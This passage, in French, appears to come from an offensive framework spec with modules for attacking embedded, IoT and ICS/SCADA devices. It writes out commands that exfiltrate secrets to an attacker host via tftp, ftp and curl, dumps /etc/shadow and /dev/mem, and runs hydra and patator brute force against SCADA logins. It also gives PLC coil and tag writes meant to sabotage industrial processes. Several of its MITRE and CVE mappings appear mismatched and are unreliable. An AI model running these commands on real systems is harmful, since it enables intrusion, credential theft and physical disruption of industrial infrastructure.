Firmwalker <firmware_path>
```

→ /output/firmware/backdoor/ghidra_report.md

---

#### 🧰 SCRIPTING :
- `firmware_unpack.sh` → extraction automatique
- `backdoor_scan.sh` → grep + analyse strings
- `firmwalker_auto.sh` → automatisation + logs

---

#### 🔗 MAPPING CVE / MITRE :
- **MITRE** : T1204 (User Execution), T1059.004 (Command and Scripting Interpreter: Unix Shell), T1070 (Indicator Removal)
- **CVE** : CVE-2021-36260 (Huawei Backdoor), CVE-2018-10562 (DSL Router Telnet), CVE-2019-18989 (Backdoor in IoT firmware)

---

#### 📁 OUTPUT :
```
/output/firmware/<target>/backdoor_scan/
/output/firmware/<target>/binary_flags.log
/output/firmware/<target>/accounts_enum.log
/output/firmware/<target>/autopwn_backdoor.bat
```

---

### 🧩 MODULE : `engine_hw_jtag_uart()`

#### 🧠 DESCRIPTION :
Audit et exploitation des interfaces matérielles **JTAG** et **UART** sur dispositifs IoT / SCADA / systèmes embarqués :
- Identification des broches, protocoles et points de debug
- Dump mémoire live via bus parallèle ou série
- Détection automatique de bootloaders, shell de debug
- Contournement d’authentification via shell UART
- Émulation partielle des firmwares via dump mémoire
- Résolution de TTP MITRE sur accès matériel local (TA0108)

---

#### 🔧 PHASE 1 : Identification des broches et de l’interface
```
Utiliser un multimetre ou analyseur logique :
- Analyse VCC, GND, RX, TX, TDI, TDO, TCK, TMS
- Mesure voltages (UART : 3.3V ou 5V)
- Sauvegarder les résultats d’analyse pinout
```

→ Documentation photographique manuelle  
→ Mapping matériel dans `/output/hw_interface/jtag_uart_pinmap.md`

---

#### 📡 PHASE 2 : Scan UART/JTAG actif
```
UART :
  - Connect via USB-TTL (FTDI, CP2102)
  - screen /dev/ttyUSB0 115200
  - logic analyzer avec Sigrok + PulseView

JTAG :
  - OpenOCD detection : openocd -f interface/<probe>.cfg -f target/<chip>.cfg
  - JTAGenum → auto-detection via brute sur TDI/TDO

DUMPS :
  - jtag-tools + urjtag : dump rom, flash, RAM
  - UART brute pour shell: envoyer `CTRL+C`, `Enter`, `help`, `root`, `admin`, `1234`
```

→ `/output/hw_interface/scan/jtag_uart_access.log`

---

#### 🧪 PHASE 3 : Shell interactif ou bypass UART
```
- Si shell root direct → exploiter
- Si bootloader → tenter `bootdelay=0`, `setenv`, `run bootcmd`
- Si login → bruteforce basique (admin/admin)
```

Commandes utiles :
```
setenv ipaddr 192.168.0.2
setenv serverip 192.168.0.1
tftpboot 0x80000000 firmware.bin
```

→ `/output/hw_interface/interactive/shell_session.txt`

---

#### 🧰 PHASE 4 : Extraction mémoire / dump firmware
```
dd if=/dev/mtd0 of=/mnt/usb/flash0.bin
cat /proc/mtd
cat /dev/ttyUSB0 > dump.log (capture continue via UART)
urjtag : cable wiggler ; detect ; include flash.cmd
```

→ `/output/hw_interface/memory_dumps/dump_*.bin`

---

#### ⚙️ SCRIPTING :
- `jtag_enum.sh` → auto-détection via urjtag / OpenOCD
- `uart_connect.sh` → initialisation FTDI + log session UART
- `firmware_dump.sh` → extraction MTD/ROM

---

#### 🔗 MAPPING CVE / MITRE :
- **MITRE** :
  - TA0108 (Physical Access)
  - T1542.001 (Boot or Logon Autostart Execution)
  - T1016.001 (System Network Configuration Discovery)
- **CVE** :
  - CVE-2019-9564 (Router Login via UART)
  - CVE-2020-0022 (Bluetooth UART exposure)
  - CVE-2018-9473 (Hardcoded Shell in UART Interface)

---

#### 📁 OUTPUT FINAL :
```
/output/iot/hardware_interface/jtag_uart_pinmap.md
/output/iot/jtag_uart/shell_output.log
/output/iot/jtag_uart/flash_dumps/
/output/iot/jtag_uart/firmware_mtd.log
```

---

### 🧩 MODULE : `engine_hw_spi_flashdump()`

#### 🧠 DESCRIPTION :
Dump physique et extraction du contenu des puces **SPI Flash** :
- Identification du type de mémoire et des interfaces
- Soudure directe ou clip SOIC-8 non-invasif
- Dump via outils comme `flashrom`, `spispy`, `CH341a`, `BusPirate`
- Détection automatique des partitions, firmware, configs, secrets
- Analyse heuristique : passwords, firmware updates, configurations système

---

#### 🔧 PHASE 1 : Identification de la puce SPI
```
- Identifier la référence de la puce (Winbond W25Q, Macronix, SST…)
- Lire datasheet pour connaitre voltage (3.3V / 1.8V / 5V)
- Utiliser une loupe numérique pour lecture sérigraphie
- Vérifier brochage (SOIC8, SOP16, DIP8…)

📷 Prendre photo et documenter référence exacte
```

→ `/output/spi_flash/id_chip_reference.md`

---

#### 🔌 PHASE 2 : Connexion matérielle
```
- Clip SOIC8 (non destructif) connecté à CH341A
- Mode 3.3V ou convertisseur 1.8V si requis
- Vérifier connexion : flashrom -p ch341a_spi -r test.bin
- Refaire 3 dumps → sha256sum pour vérifier cohérence

⚠️ Conseil : Déconnecter la puce de l’alimentation principale ou isoler VCC (via diode Schottky ou levée de pin)
```

→ `/output/spi_flash/connection_tests/sha256_check.log`

---

#### 🧪 PHASE 3 : Dump et extraction
```
Dump brut :
flashrom -p ch341a_spi -r dump_full.bin

Extraction partitions :
binwalk -e dump_full.bin

File carving :
foremost -i dump_full.bin
bulk_extractor -o extracted bulk dump_full.bin

Partition detection :
fdisk, mmls (Sleuthkit), binwalk --dd
```

→ `/output/spi_flash/dump/firmware_partition.bin`  
→ `/output/spi_flash/extracted/*`

---

#### 🕵️ PHASE 4 : Analyse avancée
```
Recherche automatique de :
- Mots de passe (passwd, shadow, wpa_supplicant.conf)
- Clés API, certificats
- Script d’init, firmware OTA, recovery mode
- Interfaces web embarquées (mini_httpd, uhttpd)
- config.xml / nvram.dat
```

→ `/output/spi_flash/analysis/secrets_found.md`

---

#### ⚙️ SCRIPTING :
- `spi_detect.sh` → test puce + identification
- `spi_dump.sh` → flashrom + checksum
- `spi_analysis.sh` → binwalk + carving + secrets

---

#### 🔗 MAPPING CVE / MITRE :
- **MITRE** :
  - T1005 (Data from Local System)
  - T1003.008 (LSASS Memory)
  - T1059.001 (Command and Scripting Interpreter: PowerShell)
- **CVE** :
  - CVE-2019-18989 (Config dump from SPI on Netgear)
  - CVE-2018-11410 (Hardcoded password in flash dump)
  - CVE-2021-20090 (Path traversal in embedded HTTP via SPI recovery)

---

#### 📁 OUTPUT FINAL :
```
/output/iot/spi_flash/dump_full.bin
/output/iot/spi_flash/extracted/*
/output/iot/spi_flash/firmware_analysis/secrets_found.md
```

---

### 🔓 `engine_exfil_loot_embedded()` — Extraction d'informations critiques sur systèmes embarqués (IoT, SCADA, firmware, appliances)

---

### 🧠 DESCRIPTION :
Exfiltration de données sensibles depuis des équipements embarqués (systèmes connectés, appliances industrielles, passerelles SCADA, routeurs) à travers une stratégie **multi-couche** :
- Dump mémoire (RAM/Flash)
- Extraction de credentials, configurations, clés cryptographiques
- Analyse de file system monté ou en RAM
- Rebond via interfaces réseau (TFTP/FTP/HTTP) ou ports exposés

---

### 🔍 PHASE 1 : Cartographie des points d’exfiltration
```
- Identifier partitions montées /mnt /etc /dev/mtdblock*
- Identifier serveurs/services actifs (webserver, FTP, SMB)
- Reconnaitre shell, BusyBox, systemd ou init.d
- repérer /etc/init.d, rc.local, crontab
```

📂 Commandes types :
```bash
mount
ls /mnt /etc
cat /etc/passwd
strings /dev/mtdblock0 | grep -i password
netstat -tulnp
```

→ `/output/loot/cartographie/system_layout.txt`

---

### 🗃️ PHASE 2 : Extraction par protocole standard
```
- TFTP exfil (si présent) : tftp -p -l file.txt <attacker_ip>
- FTP put : ftp -n <attacker_ip> << EOF …
- HTTP POST : curl -F 'file=@secrets.txt' http://attacker/upload
```

📂 Fichiers à cibler :
```bash
cat /etc/shadow
cat /etc/wpa_supplicant.conf
cat /etc/dropbear/dropbear_*_host_key
```

→ `/output/loot/exfil_protocol_based/*`

---

### 🔓 PHASE 3 : Extraction de secrets actifs
```
- Dump mémoire via gcore ou dd if=/dev/mem
- Recherche en RAM de clefs, tokens, plaintext creds
- Extraction automatique avec strings, binwalk, grep
```

```bash
dd if=/dev/mem of=/tmp/memdump.bin bs=1M count=64
strings memdump.bin | grep -i "password\|token\|secret"
```

→ `/output/loot/memdump/memdump_analysis.txt`

---

### 🧬 PHASE 4 : Exfil off-line
```
- Si pas de réseau → utiliser UART/JTAG pour extraction physique
- Rebond via clef USB si slot actif
- Copie sur /tmp puis relecture via shell

Commandes :
echo "secrets" > /tmp/usb/secrets.txt
cp /etc/*conf /tmp/usb/
```

---

### 🔍 PHASE 5 : Analyse de l’exfiltration
```
- Analyser ce que l’on a récupéré : md5sum, structure
- Identifier :
  - Passwords en clair
  - Secrets API
  - Backdoors
  - Clés SSH/SSL
  - Certificats X.509
```

→ `/output/loot/exfil/secrets_parsed.md`

---

### ⚙️ SCRIPTING :
- `loot_proto.sh` → tftp/ftp/curl + journaux
- `loot_memdump.sh` → dump + analyse automatique
- `loot_usb.sh` → exfil via filesystem local ou clé USB

---

### 🔐 MAPPING CVE / MITRE :
- **MITRE** :
  - T1005 (Data from Local System)
  - T1056.001 (Keylogging from memory)
  - T1041 (Exfiltration over Command and Control Channel)
- **CVE** :
  - CVE-2017-17101 (Huawei hardcoded creds in config dump)
  - CVE-2020-29583 (Arbitrary config exfil via web shell)

---

### 📁 OUTPUT :
```
/output/loot/cartographie/system_layout.txt
/output/loot/memdump/memdump_analysis.txt
/output/loot/exfil/secrets_parsed.md
/output/loot/exfil_protocol_based/tftp_push.log
```

---

### 🧠 MODULE : `engine_reverse_appliance()`  
> **Reverse Engineering Complet d’un Système Embarqué / Appliance Industrielle**

---

### 🧠 DESCRIPTION :

Reverse complet d’une appliance fermée ou système propriétaire (gateway IoT, box opérateur, routeur industriel, device SCADA) à partir :
- Du firmware brut
- D’images flash dumpées
- D’accès shell partiel
- D’identifiants trouvés
- D’analyse de services exposés

> Objectif : découvrir backdoors, mécanismes d’accès cachés, outils de debug, certificats embarqués, modules espions ou accès développeur désactivés.

---

### 📦 PHASE 1 : Désassemblage du firmware complet

```
- binwalk -e firmware.bin
- strings firmware.bin
- hexdump firmware.bin | grep ‘JFFS2\|UBIFS\|squashfs’
- test filesystem (squashfs, cramfs, jffs2, ubifs)
```

```bash
binwalk -eM firmware.bin
unsquashfs squashfs-root/fs.squashfs
```

→ `/output/reverse/disasm/binwalk_extracted/`

---

### 🗃️ PHASE 2 : Analyse des services embarqués

```
- Recherche de services Web, CGI, Telnet, SSH, FTP
- Parsing de fichiers de configuration : /etc/init.d, /etc/passwd, rcS
- Découverte de port debug, endpoints non documentés
```

```bash
grep -Ri "root:" ./squashfs-root/etc/
grep -Ri "telnetd" ./squashfs-root/etc/init.d/
grep -Ri "admin" ./squashfs-root/www/
```

→ `/output/reverse/services/services_detected.md`

---

### 🔍 PHASE 3 : Découverte de mots de passe / clés / tokens

```
- Extraction SHA, MD5, DES hash depuis passwd/shadow
- Recherche dans /etc/ssl/, .pem, .key, .crt
- Recherche chaînes sensibles dans binary via `strings`
- Analyse des binary ELF avec radare2
```

```bash
find ./ -name "*.key" -o -name "*.pem"
strings ./bin/app | grep -Ei "password|secret|token"
r2 -A ./bin/httpd
```

→ `/output/reverse/secrets/passwords_discovered.txt`

---

### 🧬 PHASE 4 : Identification de backdoors logicielles

```
- Fonctionnalités non documentées :
  - Auth bypass
  - Shells dormants
  - Commandes cachées
  - Pages Web invisibles (CGI)
- Analyse `cmdline`, `init`, `rc.local`, `crontab`
```

```bash
grep -Ri "debug" ./init.d/
grep -Ri "telnet -l root" ./rc.local
grep -Ri ".cgi" ./www/ | grep -v menu
```

→ `/output/reverse/backdoors/suspicious_calls.md`

---

### 📡 PHASE 5 : Reverse des binaries ELF

```
- Analyse de symboles avec Ghidra / radare2 / IDA Free
- Détection de fonctions système vulnérables
- Analyse des flux (syscall, socket, http, serial)
```

```bash
r2 -A ./bin/core_exec
is~main
afl
pdf @ main
```

→ `/output/reverse/binaries/control_flow.txt`

---

### 🔐 PHASE 6 : Mapping CVE et exploitation active

```
- Corrélation fingerprint / firmware / kernel version
- Mapping :
  - CVE kernel
  - CVE telnet/ftp/httpd
  - Bypasses HTTP Auth connus
```

→ `/output/reverse/cve/firmware_cve_report.md`

---

### ⚙️ SCRIPTING :

- `firmware_disasm.sh` → binwalk, extract, logs
- `binary_recon.sh` → radare2 analyse + grep patterns
- `reverse_summary.md` → tous les modules corrélés

---

### 🧠 MAPPING MITRE / CVE :

- **T1040** – Network Sniffing intégré au firmware
- **T1059.004** – Shell execution via injection HTTP
- **T1592.002** – Reverse engineering device binaries
- **CVE-2021-35395** – Telnet root sur Realtek SDK
- **CVE-2020-29583** – Auth bypass Netgear firmware

---

### 📁 OUTPUT :
```
/output/reverse/binwalk_extracted/
/output/reverse/secrets/passwords_discovered.txt
/output/reverse/backdoors/suspicious_calls.md
/output/reverse/services/services_detected.md
/output/reverse/cve/firmware_cve_report.md
```

---

### 🧠 MODULE : `engine_ics_hmi()` / `engine_ics_plc()`  
> **Reverse & Offensive Testing sur Interfaces Industrielles HMI/SCADA et Contrôleurs Logiques Programmables (PLC)**

---

## 🎯 OBJECTIF :

Ce module cible les systèmes industriels embarqués dans les environnements SCADA/ICS :
- Interfaces HMI (Human-Machine Interfaces)
- PLC (Programmable Logic Controllers)
- RTU (Remote Terminal Units)
- Historian Systems
- Data Acquisition/Process Control Devices

Objectif : cartographier, interroger, détourner ou saboter le comportement logique et fonctionnel des automates ou des interfaces.

---

### 🧩 PHASE 1 : Fingerprint des interfaces et automates

```bash
nmap -p 102,502,20000,44818,1911 --script modbus-discover,modbus-diagnose,modbus-read-coils,modbus-write-coils <target>
nmap -sU -p 47808 --script bacnet-info <target>
s7scan -i eth0
```

- Recherche ports :
  - 102 (Siemens S7)
  - 502 (Modbus TCP)
  - 44818 (EtherNet/IP)
  - 20000 (DNP3)
  - 2222 (CIP)
  - 9600 (Omron)
  - 47808 (BACNet)
  - 1911 (Tridium Niagara Fox)

→ `/output/ics/scan/hmi_plc_ports_detected.txt`

---

### 🔍 PHASE 2 : Reconnaissance des devices HMI

```bash
shodan search "port:1911 Niagara"
bacnet-scan -a <target>
fox-scan <target>
s7comm-cli -target <ip> --info
```

- Détection de :
  - Firmware version
  - Type d'interface HMI (CODESYS, InduSoft, Wonderware, etc.)
  - Variables affichées à l'écran (tags, process)

→ `/output/ics/hmi/device_fingerprints.md`

---

### 🧬 PHASE 3 : Dump des tags PLC / HMI

```bash
modscan.py -i <target> -p 502
modbus-cli read-coils --address <target> --start 0 --count 100
s7dump.py --target <ip>
```

- Interrogation des tags, blocs mémoire, adresses logiques
- Identification des bobines, capteurs, registres, timers

→ `/output/ics/plc/tag_list.txt`

---

### 🧨 PHASE 4 : Exploitation et détournement logique

```bash
modbus-cli write-single-coil --address <target> --coil 1 --value 0
modpoll -m tcp -t 4:int -r 1 -c 10 <target>
ethernetip_pwn.py <target> --write-tag temperature 999
```

- Réécriture de registres PLC
- Altération de paramètres (température, pression, capteur faux)
- Injection de variables dans HMI (affichage déformé)

→ `/output/ics/plc/control_override.log`

---

### 📉 PHASE 5 : Analyse des scripts HMI / automatisme

```bash
strings hmi_config.db | grep -i "tag"
grep -i "password" *.screencfg
decompile_exe SCADA_Screen.exe
```

- Dump des fichiers `.screencfg`, `.mdb`, `.exe` SCADA
- Recherche de scripts logiques mal sécurisés
- Variables en clair / mots de passe dans interfaces

→ `/output/ics/hmi/script_dump/`

---

### 🧪 PHASE 6 : Sabotage logique (simulation)

```bash
sim_modbus.py --simulate-overflow
spoof_plc_tags.py --replay-loop
pycomm3 exploit_plc -f falsify_pressure.csv
```

- Simulation :
  - Overflow mémoire
  - Loop logique infinie
  - Détournement visuel sur écran HMI
  - Replay attack depuis Historian DB

→ `/output/ics/simulations/sabotage_trace.log`

---

### 🧰 OUTILLAGE SUPPORT :

- `plcscan`, `modpoll`, `modbus-cli`, `ethernetip_pwn.py`
- `s7comm`, `s7scan`, `pycomm3`
- `shodan`, `bacnet-scan`, `fox-scan`
- `PLCInjector`, `modbusfuzz`, `MBLogic`, `Scapy`

---

### 🧠 MAPPING STRATÉGIQUE :

- MITRE ATT&CK ICS :
  - **T0854** – I/O Module Firmware
  - **T0813** – Block Command Message
  - **T0829** – Control Device Identification
  - **T0880** – Modify Parameter
  - **T0806** – Denial of Control

- CVE types :
  - CVE-2020-16205 – CODESYS v3 vulnerability
  - CVE-2022-2003 – HMI bypass
  - CVE-2019-10953 – Siemens S7 Snoop/Overflow

---

### 📝 OUTPUT :

```
/output/ics/scan/hmi_plc_ports_detected.txt
/output/ics/hmi/device_fingerprints.md
/output/ics/plc/tag_list.txt
/output/ics/plc/control_override.log
/output/ics/hmi/script_dump/*
/output/ics/simulations/sabotage_trace.log
```

---

### 🧠 MODULE : `engine_scada_authentication()`

> **Cible :** Authentifications SCADA/ICS — protocoles industriels (HMI, Historian, PLC), interfaces web locales, telnet, services propriétaires (VNC, Tridium, BACNet, CODESYS…).

> **Objectif :** Détection + bruteforce + bypass + replay + piratage de sessions actives sur services industriels critiques. Évaluation du niveau de protection (auth locale, AD, LDAP, base embarquée).

---

## 🔎 PHASE 1 : Reconnaissance des services d'authentification

```bash
nmap -sS -sV -p 21,23,80,443,502,102,1911,47808,8080 --script http-auth-finder,ftp-anon,telnet-ntlm-info <target>
```

- Détection :
  - HTTP Basic / Digest Auth
  - Login Forms SCADA/HMI (CODESYS, Schneider, Siemens…)
  - Telnet + FTP (credentials en clair)
  - Services Tridium Niagara (port 1911)
  - Authentification OPC-UA, BACNet

→ `/output/ics/authn/services_detected.log`

---

## 🧬 PHASE 2 : Bruteforce & Fuzz Authentification

```bash
hydra -L users.txt -P rockyou.txt ftp://<target>
hydra -L users.txt -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V <target>
patator http_fuzz method=POST url=https://<target>/login body='user=FILE0&pass=FILE1' 0=users.txt 1=rockyou.txt

opcua-bruteforce.py -t opc.tcp://<target>:4840 -u users.txt -p rockyou.txt
```

- Protocoles ciblés :
  - FTP, Telnet, SSH, HTTP(S), OPC-UA, Modbus Web Gateways
  - Tridium Niagara → vulnérable à credential stuffing

→ `/output/ics/authn/brute_results.txt`

---

## 🛠 PHASE 3 : Contournement & Session Hijacking

```bash
searchsploit "CODESYS unauth"
python exploit_hmi_unsecured_login.py <target>
python scada_cookie_hijack.py --target <ip> --port 443
```

- Contournements :
  - Fichiers en clair accessibles (config, sessionID)
  - Cookies JWT mal signés
  - Credentials backupés sur SMB, FTP

→ `/output/ics/authn/bypass_detected.md`

---

## 🔁 PHASE 4 : Replay ou forge de sessions

```bash
tcpdump -i eth0 port 502 or port 102 -w auth_capture.pcap
scapy_modbus_replay.py -i auth_capture.pcap -f credentials
```

- Capture :
  - Auth OPC-UA, Telnet, HTTP(s)
- Analyse avec Wireshark :
  - Tokens persistants ?
  - BasicAuth sur HTTP ?

→ `/output/ics/authn/replay_trace.txt`

---

## 🔥 PHASE 5 : Hijack ou takeover de sessions persistantes

```bash
session_enum_tool.py -i <target>
telnet <target>
→ Check if session stays alive post-disconnect

vnc_auth_bypass.py <target>
```

- HMI/SCADA parfois restent en session après déconnexion
- Injection de payload en live via même session

→ `/output/ics/authn/session_takeover.log`

---

## 🧠 MAPPING MITRE ICS :

- **T0860** – Brute Force
- **T0812** – Default Credentials
- **T0883** – Valid Accounts
- **T0805** – Exploit Public-Facing App
- **T0855** – Web Service

---

## 🔐 CVE / CAS D'USAGE :

- **CVE-2020-10612** (CODESYS Gateway unauth access)
- **CVE-2019-10953** (S7 unauth HMI access)
- **CVE-2019-18264** (Tridium JACE default creds)
- **CVE-2022-26368** (Schneider Electric bypass)

---

## 📂 OUTPUT

```
/output/ics/authn/services_detected.log
/output/ics/authn/brute_results.txt
/output/ics/authn/bypass_detected.md
/output/ics/authn/replay_trace.txt
/output/ics/authn/session_takeover.log
```

---

### 🧠 MODULE : `engine_password_hardcoded()`

> **Cible :** Appareils embarqués, firmwares, systèmes industriels, scripts init, binaires compilés.

> **Objectif :** Identifier, extraire, et tester les credentials intégrés en dur dans :
- binaires ELF / PE,
- scripts init.d / rc.local,
- firmwares compressés ou partiellement cryptés,
- systèmes embarqués où aucun mécanisme de rotation ou gestion de secret n’est appliqué.

---

## 🔍 PHASE 1 : Recherche de chaînes suspectes dans firmwares

```bash
binwalk -e firmware.bin
strings ./_firmware.extracted/* | grep -iE 'pass|passwd|pwd|login|auth' > password_candidates.txt
grep -iE 'root|admin|user' password_candidates.txt
```

→ Extraction brute de chaînes dans le firmware décompressé.

→ `/output/firmware/hardcoded/password_candidates.txt`

---

## 🔬 PHASE 2 : Recherche de credentials dans scripts init

```bash
find ./_firmware.extracted -name "*.sh" -o -name "rc.local" -o -name "init*" | xargs grep -iE "(user|login|password|pass|auth).*="
```

→ Extraction ciblée sur les mécanismes d’authentification scriptée

→ `/output/firmware/hardcoded/init_creds.txt`

---

## 🧠 PHASE 3 : Analyse heuristique ELF/PE

```bash
rabin2 -z firmware.bin | grep -i 'admin\|root\|password'
rabin2 -s firmware.bin | grep -i auth
rabin2 -rr firmware.bin | grep -i hash
```

- Recherche dans sections `.rodata`, `.data`, `.bss`
- Détection d'algorithmes de hash codés en dur (MD5, SHA1…)

→ `/output/firmware/hardcoded/static_analysis.txt`

---

## 🔗 PHASE 4 : Détection par pattern matching connu

```bash
grep -i "admin:" shadow.txt
grep -P -n '[a-zA-Z0-9]{5,}[:=][a-zA-Z0-9!@#\$%^&\*\(\)\-\+=]{5,}' password_candidates.txt
```

→ Détection de chaînes au format probable credential

→ `/output/firmware/hardcoded/regex_match.txt`

---

## 🔁 PHASE 5 : Bruteforce ou test automatisé

```bash
hydra -L extracted_users.txt -P extracted_passwords.txt ssh://<target>
crackmapexec smb <ip> -u extracted_users.txt -p extracted_passwords.txt
```

→ Posture offensive : tester les credentials extraits

→ `/output/firmware/hardcoded/validation_attempts.log`

---

## ⚠️ PHASE 6 : Mappings MITRE / CWE

- **MITRE ATT&CK ICS** :
  - T0802 – Default Credentials
  - T0859 – Modify Parameter
  - T0886 – Stored Data Manipulation
- **CWE** :
  - CWE-259 : Hardcoded Password
  - CWE-798 : Use of Hard-Coded Credentials

---

## 📚 CVE/EXEMPLES

- **CVE-2019-12562** – Cisco ASA hardcoded creds
- **CVE-2021-36260** – Hikvision hardcoded telnet creds
- **CVE-2019-12255** – IP stack with hardcoded FTP root

---

## 🧰 OUTPUTS

```
/output/firmware/hardcoded/password_candidates.txt
/output/firmware/hardcoded/init_creds.txt
/output/firmware/hardcoded/static_analysis.txt
/output/firmware/hardcoded/regex_match.txt
/output/firmware/hardcoded/validation_attempts.log
```

---

## ⚙️ MODULE PRINCIPAL : `engine_infra_embedded(target: EmbeddedTarget)`

```plaintext
🔧 Fonctionnement :

1. Identification OS / Firmware / Services / Protocoles
2. Association des signaux à des patterns d’attaque MITRE
3. Déclenchement des modules spécialisés selon conditions
4. Génération de commandes + logs nommés
5. Suivi adaptatif des stratégies (retour sur hypothèse)
```

### 🧠 Déclenchement Dynamique Basé sur Signaux
```plaintext
Si firmware image détectée :
    → trigger engine_firmware_binwalk()
    → if pattern .ssh or backdoor strings → engine_firmware_backdoor()

Si port UART ou JTAG détecté :
    → trigger engine_hw_jtag_uart()

Si protocole = MQTT or CoAP or Zigbee or BLE :
    → trigger engine_proto_mqtt(), engine_proto_coap(), engine_proto_zigbee(), engine_proto_ble()

Si protocole industriel = MODBUS / DNP3 / OPCUA :
    → trigger engine_proto_modbus(), engine_proto_dnp3(), engine_proto_opcua()

Si firmware comporte SPI Flash dump :
    → trigger engine_hw_spi_flashdump()

Si service HMI/PLC détecté via bannière :
    → trigger engine_ics_hmi(), engine_ics_plc()

Si login ou auth brute possible :
    → trigger engine_scada_authentication()

Si présence de chaînes en dur suspectes :
    → trigger engine_password_hardcoded()
```

---

## 🧩 CONDITIONS DÉCLENCHEMENT : CORRESPONDANCE INTELLIGENTE

```plaintext
IF binwalk finds embedded filesystem (ext, squashfs, cramfs):
    → Trigger binwalk_module → Extract fs
    IF password patterns or keys found:
        → Trigger firmware_backdoor_module

IF UART TX/RX/GND detected via oscilloscope or analysis:
    → Trigger jtag_uart_module

IF SPI Flash chip response valid:
    → Trigger spi_flashdump_module → carve firmware

IF port 502 open and Modbus response banner:
    → Trigger modbus_proto_module → Function code scan

IF OPCUA banner from port 4840:
    → Trigger opcua_proto_module → Node tree enum

IF MQTT banner:
    → Trigger mqtt_proto_module + anonymous publish/subscribe attempt

IF BLE beacon or advertisement:
    → Trigger ble_proto_module + replay pairing

IF CoAP service reply (UDP port 5683):
    → Trigger coap_proto_module → fuzz known endpoints

IF user=admin/password=admin found in firmware:
    → Trigger password_hardcoded_module → login automation

IF PLC fingerprint present (e.g., Siemens, Rockwell):
    → Trigger ics_plc_module → ladder logic extraction
```

---

## 📦 EXÉCUTION PARALLÈLE INTELLIGENTE : EXEMPLE

```plaintext
# Extrait simultanément tous les signaux utiles
parallel_run [
    engine_firmware_binwalk(target),
    engine_proto_modbus(target),
    engine_hw_jtag_uart(target),
    engine_exfil_loot_embedded(target)
]

# Adapte automatiquement les modules suivants si découverte positive
if engine_firmware_binwalk().findings.contains("telnetd"):
    → Trigger telnet bruteforce script via hydra

if engine_proto_opcua().nodes.contains("admin"):
    → Trigger opcua_method_invocation()

if engine_hw_jtag_uart().output.contains("bootloader shell"):
    → Trigger firmware_backdoor_enable_console()

if engine_exfil_loot_embedded().dump.contains("RSA Private Key"):
    → Trigger reverse_appliance_analysis()
```

---

## 📁 OUTPUT STRUCTURE STANDARDISÉE

```plaintext
/output/embedded/<target>/binwalk/fs_dump/
/output/embedded/<target>/proto/modbus_scan.log
/output/embedded/<target>/hw/jtag_dump.txt
/output/embedded/<target>/exfil/loot_inventory.md
/output/embedded/<target>/reverse/firmware_analysis.md
```

---
